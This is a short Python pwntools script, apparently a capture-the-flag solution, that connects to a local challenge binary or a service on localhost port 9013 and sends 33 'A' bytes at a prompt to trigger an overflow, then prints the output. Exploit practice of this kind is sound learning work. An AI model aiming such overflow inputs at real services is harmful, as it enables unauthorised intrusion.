#!/usr/bin/env python3
from pwn import *

context.log_level = "error"

p = process("./main") if args.LOCAL else remote("127.0.0.1", 9013)

p.sendlineafter(b"> ", b"A" * 33)
print(p.recvall().decode())
